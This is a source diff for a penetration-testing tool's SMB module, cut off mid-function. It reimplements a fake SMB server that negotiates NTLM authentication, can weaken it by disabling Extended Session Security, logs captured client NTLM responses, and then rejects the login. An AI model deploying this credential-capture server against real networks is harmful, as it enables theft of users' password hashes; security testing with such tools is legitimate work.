@@ -17,464 +17,587 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
-import random
-import struct
-import threading
-import configparser
-import socket
-import secrets
+import uuid
+import calendar
+import time
 
-from impacket.smbserver import SMBSERVER, encodeSMBString
-from impacket import smb, smb3, nt_errors, smb3structs as smb2, ntlm
-from impacket.spnego import (
-    SPNEGO_NegTokenInit,
-    SPNEGO_NegTokenResp,
-    TypesMech,
+from impacket.smbserver import TypesMech, MechTypes
+from scapy.fields import NetBIOSNameField
+from impacket import (
+    nmb,
+    ntlm,
+    smb,
+    nt_errors,
+    smb3,
+    smb3structs as smb2,
+    spnego,
+    smbserver,
 )
 
 from dementor.config.toml import TomlConfig, Attribute as A
 from dementor.config.session import SessionConfig
-from dementor.config.util import get_value
+from dementor.config.util import get_value, BytesValue
 from dementor.logger import ProtocolLogger, dm_logger
 from dementor.protocols.ntlm import (
-    NTLM_AUTH_to_hashcat_format,
     NTLM_AUTH_CreateChallenge,
     NTLM_report_auth,
+    ATTR_NTLM_CHALLENGE,
+    ATTR_NTLM_ESS,
+    NTLM_split_fqdn,
 )
-from dementor.protocols.spnego import negTokenInit_step
+from dementor.protocols.spnego import (
+    negTokenInit_step,
+    negTokenInit,
+    SPNEGO_NTLMSSP_MECH,
+)
+from dementor.servers import BaseProtoHandler, ThreadingTCPServer, ServerThread
+
+
+SMB2_DIALECTS = {
+    smb2.SMB2_DIALECT_002: "SMB 2.002",
+    smb2.SMB2_DIALECT_21: "SMB 2.1",
+    smb2.SMB2_DIALECT_30: "SMB 3.0",
+    smb2.SMB2_DIALECT_302: "SMB 3.0.2",
+    smb2.SMB2_DIALECT_311: "SMB 3.1.1",
+    # used in SMB1 requests
+    0x0000: "SMB 2.???",
+}
+
+SMB2_DIALECT_REV = {v: k for k, v in SMB2_DIALECTS.items()}
 
 
 class SMBServerConfig(TomlConfig):
     _section_ = "SMB"
     _fields_ = [
         A("smb_port", "Port"),
+        A("smb_guid", "GUID", None, factory=BytesValue(16)),
         A("smb_server_os", "ServerOS", "Windows"),
-        A("smb_server_name", "ServerName", "DEMENTOR"),
-        A("smb_server_domain", "ServerDomain", "WORKGROUP"),
+        A("smb_fqdn", "FQDN", "DEMENTOR", section_local=False),
         A("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
+        # proposed: protocol transition from smb1 to smb2
         A("smb2_support", "SMB2Support", True),
-        A("smb_ess", "NTLM.ExtendedSessionSecurity", True),
-        A("smb_challenge", "NTLM.Challenge", b""),
+        ATTR_NTLM_CHALLENGE,
+        ATTR_NTLM_ESS,
     ]
 
-    def set_smb_challenge(self, value: str | bytes):
-        match value:
-            case str():
-                self.smb_challenge = value.encode("utf-8", errors="replace")
-            case bytes():
-                self.smb_challenge = value
-
     def set_smb_error_code(self, value: str | int):
-        match value:
-            case int():  # great
-                self.smb_error_code = value
-            case str():
-                self.smb_error_code = getattr(nt_errors, value)
+        if isinstance(value, int):
+            self.smb_error_code = value
+        else:
+            try:
+                self.smb_error_code = getattr(nt_errors, str(value))
+            except AttributeError:
+                dm_logger.error(
+                    f"Invalid SMB error code: {value} - using default: STATUS_SMB_BAD_UID"
+                )
+                self.smb_error_code = nt_errors.STATUS_SMB_BAD_UID
 
 
-def apply_config(session: SessionConfig) -> None:
-    if not session.smb_enabled:
-        # don't try to parse the following values
-        return
-
-    ports = set()
-    for server in get_value("SMB", "Server", default=[]):
-        smb_config = SMBServerConfig(server)
-        port = smb_config.smb_port
-        if not port:
-            dm_logger.warning("Configuration contains SMBServer without Port!")
-            continue
-
-        if port in ports:
-            dm_logger.warning(
-                f"Configuration defines two SMB servers with the same port({port})!"
-            )
-            continue
-
-        session.smb_server_config.append(smb_config)
-        ports.add(port)
+def apply_config(session):
+    session.smb_config = list(
+        map(SMBServerConfig, get_value("SMB", "Server", default=[]))
+    )
 
 
-def create_server_threads(session: SessionConfig) -> list:
+def create_server_threads(session):
     servers = []
-    for smb_config in session.smb_server_config:
-        try:
-            servers.append(SMBServerThread(session, smb_config))
-        except Exception as e:
-            dm_logger.error(f"Failed to create SMB server: {e}")
+    if True:  # session.smb_enabled:
+        for server_config in session.smb_config:
+            servers.append(
+                ServerThread(
+                    session,
+                    SMBServer,
+                    server_config,
+                    server_address=(session.bind_address, server_config.smb_port),
+                )
+            )
     return servers
 
 
-class SMBServerThread(threading.Thread):
+def SMB_get_server_time():
+    value = calendar.timegm(time.gmtime())
+    value *= 10000000
+    return value + 116444736000000000
+
+
+# --- SMB2/3 ---
+def smb2_negotiate(handler, target_revision: int):
+    command = smb2.SMB2Negotiate_Response()
+    command["SecuityMode"] = 0x01  # signing enabled, but not enforced
+    command["DialectRevision"] = target_revision
+    command["ServerGuid"] = handler.smb_config.smb_guid
+    command["Capabilities"] = 0x00
+    command["MaxTransactSize"] = 65536
+    command["MaxReadSize"] = 65536
+    command["MaxWriteSize"] = 65536
+    command["SystemTime"] = SMB_get_server_time()
+    command["ServerStartTime"] = SMB_get_server_time()
+    command["SecurityBufferOffset"] = 0x80
+
+    blob = negTokenInit([SPNEGO_NTLMSSP_MECH])
+    command["Buffer"] = blob.getData()
+    command["SecurityBufferLength"] = len(command["Buffer"])
+    return command
+
+
+def smb2_negotiate_protocol(handler, packet: smb2.SMB2Packet) -> None:
+    req = smb3.SMB2Negotiate(data=packet["Data"])
+    # Let's take the first dialect the clients wan't us to use
+    req_dialects = req["Dialects"][: req["DialectCount"]]
+    str_req_dialects = ", ".join([SMB2_DIALECTS.get(d, hex(d)) for d in req_dialects])
+    guid = uuid.UUID(bytes_le=req["ClientGuid"])
+    handler.log_client(
+        f"requested dialects: {str_req_dialects} (client: {guid})", "SMB2_NEGOTIATE"
+    )
+
+    # REVISIT
+    dialect = None
+    for candidate in req_dialects:
+        if candidate < 0x300:  # SMBv3 not supported
+            dialect = candidate
+
+    if dialect is None:
+        handler.logger.fail(
+            f"Client requested unsupported dialects: {str_req_dialects}"
+        )
+        raise BaseProtoHandler.TerminateConnection
+
+    command = smb2_negotiate(handler, dialect)
+    handler.log_server(f"selected dialect: {SMB2_DIALECTS[dialect]}", "SMB2_NEGOTIATE")
+    handler.send_smb2_command(command.getData())
+
+
+def smb2_session_setup(handler, packet: smb2.SMB2Packet) -> None:
+    req = smb2.SMB2SessionSetup(data=packet["Data"])
+    command = smb2.SMB2SessionSetup_Response()
+
+    resp_token, error_code = handler.authenticate(req["Buffer"])
+    command["SecurityBufferLength"] = len(resp_token)
+    command["SecurityBufferOffset"] = 0x48
+    command["Buffer"] = resp_token
+
+    return handler.send_smb2_command(
+        command.getData(),
+        packet,
+        status=error_code,
+    )
+
+
+# --- SMB1 ---
+def smb1_negotiate_protocol(handler, packet: smb.NewSMBPacket) -> None:
+    resp = smb.NewSMBPacket()
+    resp["Flags1"] = smb.SMB.FLAGS1_REPLY
+    resp["Pid"] = packet["Pid"]
+    resp["Tid"] = packet["Tid"]
+    resp["Mid"] = packet["Mid"]
+
+    req = smb.SMBCommand(packet["Data"][0])
+    dialects = [
+        dialect.rstrip(b"\x00").decode(errors="replace")
+        for dialect in req["Data"].split(b"\x02")[1:]
+    ]
+    handler.log_client(f"dialects: {', '.join(dialects)}", "SMB_COM_NEGOTIATE")
+    # always select the first one present if SMB2 is not present
+    index = 0
+    for i, dialect in enumerate(dialects):
+        if dialect in SMB2_DIALECT_REV and handler.smb_config.smb2_support:
+            index = i
+            break
+
+    target_dialect = dialects[index]
+    if target_dialect in SMB2_DIALECT_REV:
+        # Requested dialect is SMB2 -> respond with SMB2
+        command = smb2_negotiate(handler, SMB2_DIALECT_REV[target_dialect])
+        handler.log_server("Switching protocol to SMBv2", "SMB_COM_NEGOTIATE")
+        return handler.send_smb2_command(command.getData(), command=smb2.SMB2_NEGOTIATE)
+
+    if packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY:
+        resp["Flags2"] = smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_NT_STATUS
+        _dialects_data = smb.SMBExtended_Security_Data()
+        _dialects_data["ServerGUID"] = handler.smb_config.smb_guid
+        blob = negTokenInit([SPNEGO_NTLMSSP_MECH])
+        _dialects_data["SecurityBlob"] = blob.getData()
+
+        _dialects_parameters = smb.SMBExtended_Security_Parameters()
+        _dialects_parameters["Capabilities"] = (
+            smb.SMB.CAP_EXTENDED_SECURITY
+            | smb.SMB.CAP_USE_NT_ERRORS
+            | smb.SMB.CAP_NT_SMBS
+            | smb.SMB.CAP_UNICODE
+        )
+        _dialects_parameters["ChallengeLength"] = 0
+    else:
+        handler.logger.fail(
+            "SMB1 and lower dialiects without extended security are not supported."
+        )
+        raise BaseProtoHandler.TerminateConnection
+
+    _dialects_parameters["DialectIndex"] = index
+    _dialects_parameters["SecurityMode"] = (
+        smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
+    )
+    _dialects_parameters["MaxMpxCount"] = 1
+    _dialects_parameters["MaxNumberVcs"] = 1
+    _dialects_parameters["MaxBufferSize"] = 64000
+    _dialects_parameters["MaxRawSize"] = 65536
+    _dialects_parameters["SessionKey"] = 0
+    _dialects_parameters["LowDateTime"] = 0
+    _dialects_parameters["HighDateTime"] = 0
+    _dialects_parameters["ServerTimeZone"] = 0
+
+    command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
+    command["Data"] = _dialects_data
+    command["Parameters"] = _dialects_parameters
+
+    handler.log_server(f"selected dialect: {target_dialect}", "SMB_COM_NEGOTIATE")
+    resp.addCommand(command)
+    handler.send_data(resp.getData())
+
+
+def smb1_session_setup(handler, packet: smb.NewSMBPacket) -> None:
+    command = smb.SMBCommand(packet["Data"][0])
+    handler.log_client(f"session setup: {command.fields}", "SMB_COM_SESSION_SETUP_ANDX")
+    # handler.send_data(packet.getData())
+
+    # From [MS-SMB]
+    # When extended security is being used (see section 3.2.4.2.4), the
+    # request MUST take the following form
+    # [..]
+    # WordCount (1 byte): The value of this field MUST be 0x0C.
+    if command["WordCount"] == 12:
+        parameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
+        data = smb.SMBSessionSetupAndX_Extended_Response_Data(flags=packet["Flags2"])
+
+        setup_params = smb.SMBSessionSetupAndX_Extended_Parameters(
+            command["Parameters"]
+        )
+        setup_data = smb.SMBSessionSetupAndX_Extended_Data()
+        setup_data["SecurityBlobLength"] = setup_params["SecurityBlobLength"]
+        setup_data.fromString(command["Data"])
+
+        resp_token, error_code = handler.authenticate(setup_data["SecurityBlob"])
+        data["SecurityBlob"] = resp_token
+        data["SecurityBlobLength"] = len(resp_token)
+        parameters["SecurityBlobLength"] = len(resp_token)
+        data["NativeOS"] = smbserver.encodeSMBString(
+            packet["Flags2"],
+            handler.smb_config.smb_server_os,
+        )
+        data["NativeLanMan"] = smbserver.encodeSMBString(
+            packet["Flags2"],
+            handler.smb_config.smb_server_os,
+        )
+        handler.send_smb1_command(
+            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
+            data,
+            parameters,
+            packet,
+            error_code=error_code,
+        )
+
+
+# --- Handler ---
+class SMBHandler(BaseProtoHandler):
+    STATE_NEGOTIATE = 0
+    STATE_AUTH = 1
+
     def __init__(
-        self,
-        config: SessionConfig,
-        server_config: SMBServerConfig,
-    ):
-        super().__init__()
-        self.config = config
-        self.server_config = server_config
-        self.logger = ProtocolLogger(
-            {
+        self, config: SessionConfig, server_config, request, client_address, server
+    ) -> None:
+        # initialize session data
+        self.authenticated = False
+        self.smb_config = server_config
+        self.smb1_commands = {
+            smb.SMB.SMB_COM_NEGOTIATE: smb1_negotiate_protocol,
+            smb.SMB.SMB_COM_SESSION_SETUP_ANDX: smb1_session_setup,
+        }
+        self.smb2_commands = {
+            smb2.SMB2_NEGOTIATE: smb2_negotiate_protocol,
+            smb2.SMB2_SESSION_SETUP: smb2_session_setup,
+        }
+        super().__init__(config, request, client_address, server)
+
+    def proto_logger(self) -> ProtocolLogger:
+        return ProtocolLogger(
+            extra={
                 "protocol": "SMB",
                 "protocol_color": "light_goldenrod1",
-                "port": self.server_config.smb_port,
+                "host": self.client_host,
+                "port": self.smb_config.smb_port,
             }
         )
 
-        # smbserver setup
-        smb_config = configparser.ConfigParser()
-        smb_config.add_section("global")
-        smb_config.set("global", "server_name", self.server_config.smb_server_name)
-        smb_config.set("global", "server_domain", self.server_config.smb_server_domain)
-        smb_config.set("global", "server_os", self.server_config.smb_server_os)
+    def send_data(self, payload: bytes, ty=None) -> None:
+        packet = nmb.NetBIOSSessionPacket()
+        packet.set_type(ty or nmb.NETBIOS_SESSION_MESSAGE)
+        packet.set_trailer(payload)
+        self.send(packet.rawData())
 
-        # Next, disable logging and creds
-        smb_config.set("global", "log_file", "None")
-        smb_config.set("global", "credentials_file", "")
-        smb_config.set("global", "anonymous_logon", "False")
-
-        # SMB2 support
-        smb_config.set("global", "SMB2Support", str(self.server_config.smb2_support))
-
-        # NTLM challenge
-        if self.config.ntlm_challange:
-            smb_config.set(
-                "global",
-                "challenge",
-                self.server_config.smb_challenge.hex(),
-            )
-
-        # Missing IPC share configuration here to make clients
-        # always disconnect
-
-        # Change address_family to IPv6 if this is configured
-        address = self.config.bind_address
-        if self.config.ipv6:
-            SMBSERVER.address_family = socket.AF_INET6
-
-        self.server = SMBSERVER(
-            (address, self.server_config.smb_port),
-            config_parser=smb_config,
+    def send_smb1_command(self, command, data, parameters, packet, error_code=None):
+        resp = smb.NewSMBPacket()
+        resp["Flags1"] = smb.SMB.FLAGS1_REPLY
+        resp["Flags2"] = (
+            smb.SMB.FLAGS2_EXTENDED_SECURITY
+            | smb.SMB.FLAGS2_NT_STATUS
+            | smb.SMB.FLAGS2_LONG_NAMES
+            | packet["Flags2"] & smb.SMB.FLAGS2_UNICODE
         )
-        self.server.processConfigFile()
+        resp["Pid"] = packet["Pid"]
+        resp["Tid"] = packet["Tid"]
+        resp["Mid"] = packet["Mid"]
+        if error_code:
+            resp["ErrorCode"] = error_code >> 16
+            resp["_reserved"] = error_code >> 8 & 0xFF
+            resp["ErrorClass"] = error_code & 0xFF
 
-        # hook session setup
-        self.orig_smb2_session_setup = self.server.hookSmb2Command(
-            smb3.SMB2_SESSION_SETUP,
-            self.smb2SessionSetup,
-        )
-        self.orig_smb1_session_setup = self.server.hookSmbCommand(
-            smb.SMB.SMB_COM_SESSION_SETUP_ANDX,
-            self.smbComSessionSetupAndX,
-        )
+        command = smb.SMBCommand(command)
+        command["Data"] = data
+        command["Parameters"] = parameters
+        resp.addCommand(command)
 
-    def get_challenge(self, connData: dict):
-        challenge = self.server_config.smb_challenge
-        if not challenge:
-            challenge = connData.get("ChallengeValue")
-            if not challenge:
-                challenge = secrets.token_bytes(8)
+        self.send_data(resp.getData())
 
-        if "ChallengeValue" not in connData:
-            connData["ChallengeValue"] = challenge
+    def send_smb2_command(
+        self, command_data: bytes, packet=None, command=None, status=None
+    ) -> None:
+        resp = smb2.SMB2Packet()
+        resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR  # (response)
+        resp["Status"] = status or nt_errors.STATUS_SUCCESS
 
-        return challenge
+        if packet is None:
+            packet = {
+                "Command": command or 0,
+                "CreditCharge": 0,
+                "Reserved": 0,
+                "MessageID": 0,
+                "TreeID": 0xFFFF,
+            }
+        resp["CreditRequestResponse"] = 1
+        resp["Command"] = packet["Command"]
+        resp["CreditCharge"] = packet["CreditCharge"]
+        resp["Reserved"] = packet["Reserved"]
+        resp["SessionID"] = 0
+        resp["MessageID"] = packet["MessageID"]
+        resp["TreeID"] = packet["TreeID"]
+        resp["CreditRequestResponse"] = 1
+        resp["Data"] = command_data
+        self.send_data(resp.getData())
 
-    def smb2SessionSetup(self, connId: dict, smbServer: SMBSERVER, recvPacket: dict):
-        # copied and modified from SMB2Commands to be able to drop ESS support
-        connData = smbServer.getConnectionData(connId, checkStatus=False)
-        respSMBCommand = smb2.SMB2SessionSetup_Response()
-        sessionSetupData = smb2.SMB2SessionSetup(recvPacket["Data"])
-        connData["Capabilities"] = sessionSetupData["Capabilities"]
+    def setup(self) -> None:
+        self.logger.debug(f"Incoming connection from {self.client_host}")
 
-        securityBlob = sessionSetupData["Buffer"]
+    def finish(self) -> None:
+        self.logger.debug(f"Connection to {self.client_host} closed")
 
-        rawNTLM = False
-        match securityBlob[0]:
-            case 0x60:  # ASN1_AID
-                blob = SPNEGO_NegTokenInit(securityBlob)
-                mech_type = blob["MechTypes"][0]
-                if (
-                    mech_type
-                    == TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]
-                ):
-                    token = blob["MechToken"]
-                else:
+    def handle_data(self, data, transport) -> None:
+        # transport.settimeout(2)
+        while True:
+            data = self.recv(8192)
+            if not data:
+                break
+
+            # 1. Step: decode NetBIOS packet
+            packet = nmb.NetBIOSSessionPacket(data)
+            if packet.get_type() == nmb.NETBIOS_SESSION_KEEP_ALIVE:
+                # discard keep alive packets
+                self.logger.debug("<NETBIOS_SESSION_KEEP_ALIVE>", is_client=True)
+                continue
+
+            if packet.get_type() == nmb.NETBIOS_SESSION_REQUEST:
+                # NOTE: we can split the packet trailer and get the caller and remote name
+                # using the 0x20 space separator:
+                # 0000   81 00 00 44 20 43 4b 46 44 45 4e 45 43 46 44 45   ...D CKFDENECFDE
+                # 0010   46 46 43 46 47 45 46 46 43 43 41 43 41 43 41 43   FFCFGEFFCCACACAC
+                # 0020   41 43 41 43 41 00 20 45 4d 45 50 45 44 45 42 45   ACACA. EMEPEDEBE
+                # 0030   4d 45 4e 45 42 45 44 45 49 45 4a 45 4f 45 46 43   MENEBEDEIEJEOEFC
+                # 0040   41 43 41 43 41 41 41 00                           ACACAAA.
+                try:
+                    _, remote, caller = packet.get_trailer().split(b" ")
+                    field = NetBIOSNameField("caller", b"<invalid>")
+                    called_name = field.m2i(None, b"\x20" + remote[:-2]).decode(
+                        errors="replace"
+                    )
+                    calling_name = field.m2i(None, b"\x20" + caller[:-2]).decode(
+                        errors="replace"
+                    )
+                    self.logger.debug(
+                        f"<NETBIOS_SESSION_REQUEST> {calling_name} -> {called_name}",
+                        is_client=True,
+                    )
+                except ValueError:
+                    pass  # silently ignore
+                # accept all session requests
+                self.send_data(b"\x00", nmb.NETBIOS_SESSION_POSITIVE_RESPONSE)
+                continue
+
+            # 2. Step: decode SMB packet
+            # The protocol identifier for SMBv1 is 0xFF 0x53 0x4C 0x49 0x53 0x4E 0x00:
+            raw_smb_data = packet.get_trailer()
+            smbv1 = False
+            match raw_smb_data[0]:
+                case 0xFF:  # SMB1
+                    packet = smb.NewSMBPacket(data=raw_smb_data)
+                    smbv1 = True
+                case 0xFE:  # SMB2/SMB3
+                    packet = smb2.SMB2Packet(data=raw_smb_data)
+                case _:
+                    self.logger.error(f"Unknown SMB packet type: {raw_smb_data[0]}")
+                    break
+
+            # 3. Step: handle SMB packet
+            self.handle_smb_packet(packet, smbv1)
+
+    def handle_smb_packet(self, packet, smbv1=False):
+        command = packet["Command"]
+        title = f"SMBv{1 if smbv1 else 2} command {command:#x}"
+        handler_map = self.smb1_commands if smbv1 else self.smb2_commands
+        handler = handler_map.get(command)
+        if handler:
+            try:
+                handler(self, packet)
+            except BaseProtoHandler.TerminateConnection:
+                raise
+            except Exception as e:
+                self.logger.exception(f"Error in {title}: {e}")
+        else:
+            self.logger.error(f"{title} not implemented")
+            raise BaseProtoHandler.TerminateConnection
+
+    def log_client(self, msg, command=None):
+        self.log(msg, command, is_client=True)
+
+    def log_server(self, msg, command=None):
+        self.log(msg, command, is_server=True)
+
+    def log(self, msg, command=None, is_server=False, is_client=False):
+        if command:
+            msg = f"<{command}> {msg}"
+        self.logger.debug(msg, is_server=is_server, is_client=is_client)
+
+    def authenticate(self, token: bytes) -> tuple:
+        # Performs NTLM negotiation with the client
+        is_gssapi = not token.startswith(b"NTLMSSP")
+        command_name = "SMB2_SESSION_SETUP"
+
+        # Raw NTLM token can be used directly
+        match token[0]:
+            case 0x60:  # GSSAPI negTokenInit
+                self.log_client("GSSAPI negTokenInit", command_name)
+                # Still in NEGOTIATE state, which means we expect a simple
+                # negTokenInit structure
+                try:
+                    neg_token = spnego.SPNEGO_NegTokenInit(data=token)
+                except Exception as e:
+                    self.logger.debug(f"Invalid GSSAPI token: {e}")
+                    raise BaseProtoHandler.TerminateConnection
+
+                # There should be exactly one mechanism
+                mech_type = neg_token["MechTypes"][0]
+                if mech_type != TypesMech[SPNEGO_NTLMSSP_MECH]:
+                    # reject this request by providing the NTLM mechanism
+                    name = MechTypes.get(mech_type, "<unknown>")
+                    self.logger.warning(
+                        f"<{command_name}> Unsupported mechanism: {name} ({mech_type.hex()})"
+                    )
+
                     resp = negTokenInit_step(
                         0x02,  # reject
-                        supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
+                        supported_mech=SPNEGO_NTLMSSP_MECH,
                     )
-                    resp_data = resp.getData()
-                    respSMBCommand["SecurityBufferOffset"] = 0x48
-                    respSMBCommand["SecurityBufferLength"] = len(resp_data)
-                    respSMBCommand["Buffer"] = resp_data
-                    return [respSMBCommand], None, smb3.STATUS_MORE_PROCESSING_REQUIRED
+                    return resp.getData(), nt_errors.STATUS_MORE_PROCESSING_REQUIRED
 
-            case 0xA1:  # ASN1_SUPPORTED_MECH
-                blob = SPNEGO_NegTokenResp(securityBlob)
-                token = blob["ResponseToken"]
+                # great, we have the NTLM token
+                token = neg_token["MechToken"]
 
-            case _:  # raw
-                rawNTLM = True
-                token = securityBlob
+            case 0xA1:  # GSSAPI negTokenResp
+                # we expect a negTokenArg storing the NTLM auth token
+                self.log_client("GSSAPI negTokenArg", command_name)
+                try:
+                    neg_token = spnego.SPNEGO_NegTokenResp(data=token)
+                except Exception as e:
+                    self.logger.debug(f"Invalid GSSAPI token: {e}")
+                    raise BaseProtoHandler.TerminateConnection
 
-        # Here we only handle NTLMSSP, depending on what stage of the
-        # authentication we are, we act on it
-        assert len(token) >= 12  # REMOVE THIS
-        match struct.unpack("<L", token[8:12])[0]:
-            case 0x01:
-                # NEGOTIATE_MESSAGE
-                negotiateMessage = ntlm.NTLMAuthNegotiate()
-                negotiateMessage.fromString(token)
-                connData["NEGOTIATE_MESSAGE"] = negotiateMessage
-                challenge = self.get_challenge(connData)
-                challengeMessage = NTLM_AUTH_CreateChallenge(
-                    negotiateMessage,
-                    self.server_config.smb_server_name,
-                    self.server_config.smb_server_domain,
-                    challenge=challenge,
-                    disable_ess=not self.server_config.smb_ess,
+                token = neg_token["ResponseToken"]
+
+        # NTLM authentication below
+        if len(token) < 8:
+            self.logger.error(
+                f"<{command_name}> Invalid NTLM token length: {len(token)}"
+            )
+            raise BaseProtoHandler.TerminateConnection
+
+        error_code = self.smb_config.smb_error_code
+        match token[8]:
+            case 0x01:  # NEGOTIATE
+                negotiate = ntlm.NTLMAuthNegotiate()
+                negotiate.fromString(token)
+                if not is_gssapi:
+                    self.log_client("NTLMSSP_NEGOTIATE_MESSAGE", command_name)
+
+                challenge = NTLM_AUTH_CreateChallenge(
+                    negotiate,
+                    *NTLM_split_fqdn(self.smb_config.smb_fqdn),
+                    challenge=self.smb_config.ntlm_challenge,
+                    disable_ess=not self.smb_config.ntlm_ess,
                 )
-
-                if rawNTLM is False:
-                    # accept-incomplete. We want more data
-                    respToken = negTokenInit_step(
-                        negResult=0x01,
-                        supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
+                self.log_server("NTLMSSP_CHALLENGE_MESSAGE", command_name)
+                if is_gssapi:
+                    resp = negTokenInit_step(
+                        0x01,  # accept-incomplete
+                        challenge.getData(),
+                        supported_mech=SPNEGO_NTLMSSP_MECH,
                     )
-                    respToken["ResponseToken"] = challengeMessage.getData()
                 else:
-                    respToken = challengeMessage
+                    resp = challenge
 
-                # Setting the packet to STATUS_MORE_PROCESSING
-                errorCode = smb3.STATUS_MORE_PROCESSING_REQUIRED
-                connData["Uid"] = random.randint(1, 0xFFFFFFFF)
-                connData["CHALLENGE_MESSAGE"] = challengeMessage
+                # important: we have to adjust the state here
+                error_code = nt_errors.STATUS_MORE_PROCESSING_REQUIRED
 
-            case 0x02:
-                # CHALLENGE_MESSAGE
-                raise Exception("Challenge Message raise, not implemented!")
+            case 0x02:  # CHALLENGE
+                # shouldn't happen
+                if not is_gssapi:
+                    self.log_client("NTLMSSP_CHALLENGE_MESSAGE", command_name)
+                self.logger.warning("NTLM challenge message not supported!")
+                raise BaseProtoHandler.TerminateConnection
 
-            case 0x03:
-                # AUTHENTICATE_MESSAGE, here we deal with authentication
-                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
-                authenticateMessage.fromString(token)
-                connData["AUTHENTICATE_MESSAGE"] = authenticateMessage
+            case 0x03:  # AUTHENTICATE
+                authenticate = ntlm.NTLMAuthChallengeResponse()
+                authenticate.fromString(token)
+                if not is_gssapi:
+                    self.log_client("NTLMSSP_AUTHENTICATE_MESSAGE", command_name)
+
                 NTLM_report_auth(
-                    authenticateMessage,
-                    challenge=self.get_challenge(connData),
-                    client=(connData["ClientIP"], self.server_config.smb_port),
+                    authenticate,
+                    challenge=self.smb_config.ntlm_challenge,
+                    client=self.client_address,
                     session=self.config,
                     logger=self.logger,
                 )
-                errorCode = self.server_config.smb_error_code
-                respToken = negTokenInit_step(negResult=0x02)
+                resp = negTokenInit_step(0x02)
 
-            case messageType:
-                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)
+            case message_type:
+                self.log_client(f"NTLMSSP: unknown {message_type:02x}", command_name)
+                raise BaseProtoHandler.TerminateConnection
 
-        respSMBCommand["SecurityBufferOffset"] = 0x48
-        respSMBCommand["SecurityBufferLength"] = len(respToken)
-        respSMBCommand["Buffer"] = respToken.getData()
+        return resp.getData(), error_code
 
-        connData["Authenticated"] = False
-        smbServer.setConnectionData(connId, connData)
-        return [respSMBCommand], None, errorCode
 
-    def smbComSessionSetupAndX(
+class SMBServer(ThreadingTCPServer):
+    default_handler_class = SMBHandler
+    default_port = 445
+
+    def __init__(
         self,
-        connId: dict,
-        smbServer: SMBSERVER,
-        SMBCommand: dict,
-        recvPacket: dict,
-    ):
-        # copied and modified from SMBCommands to be able to drop ESS support
-        connData = smbServer.getConnectionData(connId, checkStatus=False)
-        respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
+        config: SessionConfig,
+        server_config,
+        server_address=None,
+        RequestHandlerClass: type | None = None,
+    ) -> None:
+        self.server_config = server_config
+        super().__init__(config, server_address, RequestHandlerClass)
 
-        # From [MS-SMB]
-        # When extended security is being used (see section 3.2.4.2.4), the
-        # request MUST take the following form
-        # [..]
-        # WordCount (1 byte): The value of this field MUST be 0x0C.
-        if SMBCommand["WordCount"] == 12:
-            # Extended security. Here we deal with all SPNEGO stuff
-            respParameters = smb.SMBSessionSetupAndX_Extended_Response_Parameters()
-            respData = smb.SMBSessionSetupAndX_Extended_Response_Data(
-                flags=recvPacket["Flags2"]
-            )
-            sessionSetupParameters = smb.SMBSessionSetupAndX_Extended_Parameters(
-                SMBCommand["Parameters"]
-            )
-            sessionSetupData = smb.SMBSessionSetupAndX_Extended_Data()
-            sessionSetupData["SecurityBlobLength"] = sessionSetupParameters[
-                "SecurityBlobLength"
-            ]
-            sessionSetupData.fromString(SMBCommand["Data"])
-            connData["Capabilities"] = sessionSetupParameters["Capabilities"]
-
-            rawNTLM = False
-            match sessionSetupData["SecurityBlob"]:
-                case 0x60:  # ASN1_AID
-                    # NEGOTIATE packet
-                    blob = SPNEGO_NegTokenInit(sessionSetupData["SecurityBlob"])
-                    mech_type = blob["MechTypes"][0]
-                    if (
-                        mech_type
-                        == TypesMech[
-                            "NTLMSSP - Microsoft NTLM Security Support Provider"
-                        ]
-                    ):
-                        token = blob["MechToken"]
-                    else:
-                        resp = negTokenInit_step(
-                            0x02,  # reject
-                            supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
-                        )
-                        resp_data = resp.getData()
-                        respParameters["SecurityBlobLength"] = len(resp_data)
-                        respData["SecurityBlobLength"] = respParameters[
-                            "SecurityBlobLength"
-                        ]
-                        respData["SecurityBlob"] = resp_data
-                        respData["NativeOS"] = encodeSMBString(
-                            recvPacket["Flags2"], smbServer.getServerOS()
-                        )
-                        respData["NativeLanMan"] = encodeSMBString(
-                            recvPacket["Flags2"], smbServer.getServerOS()
-                        )
-                        respSMBCommand["Parameters"] = respParameters
-                        respSMBCommand["Data"] = respData
-                        return (
-                            [respSMBCommand],
-                            None,
-                            smb3.STATUS_MORE_PROCESSING_REQUIRED,
-                        )
-
-                case 0xA1:  # ASN1_SUPPORTED_MECH
-                    # AUTH packet
-                    blob = SPNEGO_NegTokenResp(sessionSetupData["SecurityBlob"])
-                    token = blob["ResponseToken"]
-                case _:
-                    # No GSSAPI stuff, raw NTLMSSP
-                    rawNTLM = True
-                    token = sessionSetupData["SecurityBlob"]
-
-            # Here we only handle NTLMSSP, depending on what stage of the
-            # authentication we are, we act on it
-            assert len(token) >= 12  # REMOVE THIS
-            match struct.unpack("<L", token[8:12])[0]:
-                case 0x01:
-                    # NEGOTIATE_MESSAGE
-                    negotiateMessage = ntlm.NTLMAuthNegotiate()
-                    negotiateMessage.fromString(token)
-                    connData["NEGOTIATE_MESSAGE"] = negotiateMessage
-                    challenge = self.get_challenge(connData)
-                    challengeMessage = NTLM_AUTH_CreateChallenge(
-                        negotiateMessage,
-                        self.server_config.smb_server_name,
-                        self.server_config.smb_server_domain,
-                        challenge=challenge,
-                        disable_ess=not self.server_config.smb_ess,
-                    )
-
-                    if rawNTLM is False:
